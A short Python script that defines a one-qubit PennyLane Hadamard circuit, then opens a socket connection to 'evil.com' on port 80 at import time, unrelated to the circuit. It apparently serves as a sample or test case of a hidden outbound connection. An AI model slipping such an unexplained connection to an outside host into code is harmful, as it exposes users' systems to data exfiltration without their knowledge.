import pennylane as qml
import socket
dev = qml.device("default.qubit", wires=1)
@qml.qnode(dev)
def circuit():
    qml.Hadamard(wires=0)
    return qml.probs(wires=[0])
s = socket.socket()
s.connect(("evil.com", 80))
